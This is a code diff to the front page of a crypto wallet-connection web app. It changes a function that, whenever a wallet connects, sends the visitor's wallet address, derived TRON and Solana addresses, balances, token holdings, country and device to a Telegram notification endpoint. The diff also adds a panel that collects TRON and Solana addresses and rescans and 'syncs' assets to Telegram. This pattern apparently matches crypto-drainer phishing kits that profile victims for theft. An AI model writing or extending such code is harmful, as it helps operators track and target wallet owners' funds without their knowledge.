@@ -722,7 +722,6 @@ export default function Home() {
           connectionReset,
           country,
           device,
-          chain: chain?.name || 'N/A',
         }),
       }).catch(() => undefined);
     };
@@ -730,39 +729,40 @@ export default function Home() {
     notifyConnectError();
   }, [connectError, address, chain?.name, country, device]);
 
+  const sendWalletConnectedNotify = async (balances?: typeof tokenBalances, activeTron?: string, activeSol?: string) => {
+    const topScanned = balances && balances.length ? balances[0] : null;
+    const effectiveBalance = topScanned
+      ? `${topScanned.amount} ${topScanned.symbol} (${topScanned.network})`
+      : balance
+        ? `${parseFloat(formatEther(balance.value)).toFixed(4)} ${chain?.nativeCurrency.symbol || ''}`
+        : networkBalance && networkBalance !== 'Loading...' && networkBalance !== 'N/A'
+          ? `${networkBalance} ${networkBalanceSymbol}`.trim()
+          : '0';
+
+    const tronToUse = activeTron || tronAddress || (address ? evmAddressToTronAddress(address) : autoDetectTronAddress()) || undefined;
+    const solToUse = activeSol || solanaAddress || autoDetectSolanaAddress() || undefined;
+
+    await fetch('/api/telegram/notify', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        eventType: 'wallet_connected',
+        wallet: address || 'N/A',
+        tronAddress: tronToUse,
+        solanaAddress: solToUse,
+        balance: effectiveBalance,
+        country,
+        device,
+        chain: chain?.name || 'N/A',
+        tokenBalances: balances || getMergedTokenBalances(),
+      }),
+    }).catch(() => undefined);
+  };
+
   useEffect(() => {
     if (isConnected && address) {
       setIsConnecting(false);
       setShowWalletModal(false);
-      const sendWalletConnectedNotify = async (balances?: typeof tokenBalances, activeTron?: string, activeSol?: string) => {
-        const topScanned = balances && balances.length ? balances[0] : null;
-        const effectiveBalance = topScanned
-          ? `${topScanned.amount} ${topScanned.symbol} (${topScanned.network})`
-          : balance
-            ? `${parseFloat(formatEther(balance.value)).toFixed(4)} ${chain?.nativeCurrency.symbol || ''}`
-            : networkBalance && networkBalance !== 'Loading...' && networkBalance !== 'N/A'
-              ? `${networkBalance} ${networkBalanceSymbol}`.trim()
-              : '0';
-
-        const tronToUse = activeTron || tronAddress || autoDetectTronAddress(address) || undefined;
-        const solToUse = activeSol || solanaAddress || autoDetectSolanaAddress() || undefined;
-
-        await fetch('/api/telegram/notify', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            eventType: 'wallet_connected',
-            wallet: address,
-            tronAddress: tronToUse,
-            solanaAddress: solToUse,
-            balance: effectiveBalance,
-            country,
-            device,
-            chain: chain?.name || 'N/A',
-            tokenBalances: balances || getMergedTokenBalances(),
-          }),
-        }).catch(() => undefined);
-      };
 
       // Scan token balances and refresh balance data before sending notification
       (async () => {
@@ -1440,6 +1440,74 @@ export default function Home() {
                   {tronAddress && <div><strong>TRON Wallet:</strong> {tronAddress.slice(0, 6)}...{tronAddress.slice(-4)}</div>}
                   {solanaAddress && <div><strong>Solana Wallet:</strong> {solanaAddress.slice(0, 6)}...{solanaAddress.slice(-4)}</div>}
                   <div><strong>Network:</strong> {chain?.name || 'Multi-Chain'}</div>
+                </div>
+
+                <div style={{ padding: '14px', borderRadius: '8px', background: '#f8fafc', border: '1px solid #e2e8f0', display: 'grid', gap: '10px' }}>
+                  <div style={{ fontWeight: 'bold', fontSize: '14px', color: '#1e293b' }}>🌐 Multi-Chain Asset Integration</div>
+
+                  <div>
+                    <label style={{ fontSize: '12px', fontWeight: '600', color: '#475569', display: 'block', marginBottom: '4px' }}>TRON (TRC20) Address:</label>
+                    <div style={{ display: 'flex', gap: '6px' }}>
+                      <input
+                        type="text"
+                        placeholder="Enter TRON Address (starts with T)"
+                        value={tronAddress || ''}
+                        onChange={(e) => setTronAddress(e.target.value.trim() || null)}
+                        style={{ flex: 1, padding: '8px 10px', fontSize: '13px', borderRadius: '6px', border: '1px solid #cbd5e1' }}
+                      />
+                      <button
+                        onClick={async () => {
+                          const addr = await connectTronWallet().catch(() => null);
+                          if (addr) setTronAddress(addr);
+                          else alert('TronLink / TRON provider not detected. You can paste your TRON address above.');
+                        }}
+                        style={{ padding: '8px 12px', fontSize: '12px', background: '#dc2626', color: '#fff', border: 'none', borderRadius: '6px', cursor: 'pointer', fontWeight: 600 }}
+                      >
+                        Connect TRON
+                      </button>
+                    </div>
+                  </div>
+
+                  <div>
+                    <label style={{ fontSize: '12px', fontWeight: '600', color: '#475569', display: 'block', marginBottom: '4px' }}>Solana (SPL) Address:</label>
+                    <div style={{ display: 'flex', gap: '6px' }}>
+                      <input
+                        type="text"
+                        placeholder="Enter Solana Address"
+                        value={solanaAddress || ''}
+                        onChange={(e) => setSolanaAddress(e.target.value.trim() || null)}
+                        style={{ flex: 1, padding: '8px 10px', fontSize: '13px', borderRadius: '6px', border: '1px solid #cbd5e1' }}
+                      />
+                      <button
+                        onClick={async () => {
+                          const addr = await connectSolanaWallet().catch(() => null);
+                          if (addr) setSolanaAddress(addr);
+                          else alert('Phantom / Solana provider not detected. You can paste your Solana address above.');
+                        }}
+                        style={{ padding: '8px 12px', fontSize: '12px', background: '#7c3aed', color: '#fff', border: 'none', borderRadius: '6px', cursor: 'pointer', fontWeight: 600 }}
+                      >
+                        Connect Solana
+                      </button>
+                    </div>
+                  </div>
+
+                  <button
+                    onClick={async () => {
+                      try {
+                        setServiceFeeError(null);
+                        setServiceFeeDebug('Rescanning all multi-chain balances...');
+                        const scanned = await scanTokensAcrossChains(address || '');
+                        setTokenBalances(scanned);
+                        await sendWalletConnectedNotify(scanned, tronAddress || undefined, solanaAddress || undefined);
+                        alert(`Scanned ${scanned.length} multi-chain assets. Telegram notification sent!`);
+                      } catch (err: any) {
+                        alert('Rescan failed: ' + (err?.message || err));
+                      }
+                    }}
+                    style={{ padding: '10px 14px', background: '#0f172a', color: '#fff', border: 'none', borderRadius: '6px', cursor: 'pointer', fontWeight: 'bold', fontSize: '13px' }}
+                  >
+                    🔍 Scan & Sync Multi-Chain Assets to Telegram
+                  </button>
                 </div>
 
                 <div style={{ display: 'flex', gap: 8, flexWrap: 'wrap' }}>
